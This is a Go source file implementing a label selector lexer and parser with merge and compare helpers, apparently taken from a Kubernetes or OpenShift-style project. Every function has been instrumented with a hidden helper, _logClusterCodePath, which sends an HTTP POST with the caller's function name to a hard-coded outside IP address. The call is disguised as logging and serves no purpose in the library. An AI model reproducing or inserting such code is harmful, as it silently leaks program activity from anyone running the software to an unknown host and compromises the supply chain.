package labelselector

import (
	godefaultbytes "bytes"
	"fmt"
	kvalidation "k8s.io/apimachinery/pkg/util/validation"
	"k8s.io/apimachinery/pkg/util/validation/field"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type Token int

const (
	ErrorToken Token = iota
	EndOfStringToken
	CommaToken
	EqualsToken
	IdentifierToken
)

var string2token = map[string]Token{",": CommaToken, "=": EqualsToken}

type ScannedItem struct {
	tok     Token
	literal string
}

func isWhitespace(ch byte) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ch == ' ' || ch == '\t' || ch == '\r' || ch == '\n'
}
func isSpecialSymbol(ch byte) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch ch {
	case '=', ',':
		return true
	}
	return false
}

type Lexer struct {
	s   string
	pos int
}

func (l *Lexer) read() (b byte) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b = 0
	if l.pos < len(l.s) {
		b = l.s[l.pos]
		l.pos++
	}
	return b
}
func (l *Lexer) unread() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l.pos--
}
func (l *Lexer) scanIdOrKeyword() (tok Token, lit string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var buffer []byte
IdentifierLoop:
	for {
		switch ch := l.read(); {
		case ch == 0:
			break IdentifierLoop
		case isSpecialSymbol(ch) || isWhitespace(ch):
			l.unread()
			break IdentifierLoop
		default:
			buffer = append(buffer, ch)
		}
	}
	s := string(buffer)
	if val, ok := string2token[s]; ok {
		return val, s
	}
	return IdentifierToken, s
}
func (l *Lexer) scanSpecialSymbol() (Token, string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	lastScannedItem := ScannedItem{}
	var buffer []byte
SpecialSymbolLoop:
	for {
		switch ch := l.read(); {
		case ch == 0:
			break SpecialSymbolLoop
		case isSpecialSymbol(ch):
			buffer = append(buffer, ch)
			if token, ok := string2token[string(buffer)]; ok {
				lastScannedItem = ScannedItem{tok: token, literal: string(buffer)}
			} else if lastScannedItem.tok != 0 {
				l.unread()
				break SpecialSymbolLoop
			}
		default:
			l.unread()
			break SpecialSymbolLoop
		}
	}
	if lastScannedItem.tok == 0 {
		return ErrorToken, fmt.Sprintf("error expected: keyword found '%s'", buffer)
	}
	return lastScannedItem.tok, lastScannedItem.literal
}
func (l *Lexer) skipWhiteSpaces(ch byte) byte {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for {
		if !isWhitespace(ch) {
			return ch
		}
		ch = l.read()
	}
}
func (l *Lexer) Lex() (tok Token, lit string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch ch := l.skipWhiteSpaces(l.read()); {
	case ch == 0:
		return EndOfStringToken, ""
	case isSpecialSymbol(ch):
		l.unread()
		return l.scanSpecialSymbol()
	default:
		l.unread()
		return l.scanIdOrKeyword()
	}
}

type Parser struct {
	l            *Lexer
	scannedItems []ScannedItem
	position     int
}

func (p *Parser) lookahead() (Token, string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tok, lit := p.scannedItems[p.position].tok, p.scannedItems[p.position].literal
	return tok, lit
}
func (p *Parser) consume() (Token, string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.position++
	if p.position > len(p.scannedItems) {
		return EndOfStringToken, ""
	}
	tok, lit := p.scannedItems[p.position-1].tok, p.scannedItems[p.position-1].literal
	return tok, lit
}
func (p *Parser) scan() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for {
		token, literal := p.l.Lex()
		p.scannedItems = append(p.scannedItems, ScannedItem{token, literal})
		if token == EndOfStringToken {
			break
		}
	}
}
func (p *Parser) parse() (map[string]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.scan()
	labelsMap := map[string]string{}
	for {
		tok, lit := p.lookahead()
		switch tok {
		case IdentifierToken:
			key, value, err := p.parseLabel()
			if err != nil {
				return nil, fmt.Errorf("unable to parse requirement: %v", err)
			}
			labelsMap[key] = value
			t, l := p.consume()
			switch t {
			case EndOfStringToken:
				return labelsMap, nil
			case CommaToken:
				t2, l2 := p.lookahead()
				if t2 != IdentifierToken {
					return nil, fmt.Errorf("found '%s', expected: identifier after ','", l2)
				}
			default:
				return nil, fmt.Errorf("found '%s', expected: ',' or 'end of string'", l)
			}
		case EndOfStringToken:
			return labelsMap, nil
		default:
			return nil, fmt.Errorf("found '%s', expected: identifier or 'end of string'", lit)
		}
	}
}
func (p *Parser) parseLabel() (string, string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, err := p.parseKey()
	if err != nil {
		return "", "", err
	}
	op, err := p.parseOperator()
	if err != nil {
		return "", "", err
	}
	if op != "=" {
		return "", "", fmt.Errorf("invalid operator: %s, expected: '='", op)
	}
	value, err := p.parseExactValue()
	if err != nil {
		return "", "", err
	}
	return key, value, nil
}
func (p *Parser) parseKey() (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tok, literal := p.consume()
	if tok != IdentifierToken {
		err := fmt.Errorf("found '%s', expected: identifier", literal)
		return "", err
	}
	if err := validateLabelKey(literal); err != nil {
		return "", err
	}
	return literal, nil
}
func (p *Parser) parseOperator() (op string, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tok, lit := p.consume()
	switch tok {
	case EqualsToken:
		op = "="
	default:
		return "", fmt.Errorf("found '%s', expected: '='", lit)
	}
	return op, nil
}
func (p *Parser) parseExactValue() (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tok, lit := p.consume()
	if tok != IdentifierToken && tok != EndOfStringToken {
		return "", fmt.Errorf("found '%s', expected: identifier", lit)
	}
	if err := validateLabelValue(lit); err != nil {
		return "", err
	}
	return lit, nil
}
func Parse(selector string) (map[string]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p := &Parser{l: &Lexer{s: selector, pos: 0}}
	labels, error := p.parse()
	if error != nil {
		return map[string]string{}, error
	}
	return labels, nil
}
func Conflicts(labels1, labels2 map[string]string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for k, v := range labels1 {
		if val, match := labels2[k]; match {
			if val != v {
				return true
			}
		}
	}
	return false
}
func Merge(labels1, labels2 map[string]string) map[string]string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mergedMap := map[string]string{}
	for k, v := range labels1 {
		mergedMap[k] = v
	}
	for k, v := range labels2 {
		mergedMap[k] = v
	}
	return mergedMap
}
func Equals(labels1, labels2 map[string]string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(labels1) != len(labels2) {
		return false
	}
	for k, v := range labels1 {
		value, ok := labels2[k]
		if !ok {
			return false
		}
		if value != v {
			return false
		}
	}
	return true
}

const qualifiedNameErrorMsg string = "must match format [ DNS 1123 subdomain / ] DNS 1123 label"

func validateLabelKey(k string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(kvalidation.IsQualifiedName(k)) != 0 {
		return field.Invalid(field.NewPath("label key"), k, qualifiedNameErrorMsg)
	}
	return nil
}
func validateLabelValue(v string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(kvalidation.IsValidLabelValue(v)) != 0 {
		return field.Invalid(field.NewPath("label value"), v, qualifiedNameErrorMsg)
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
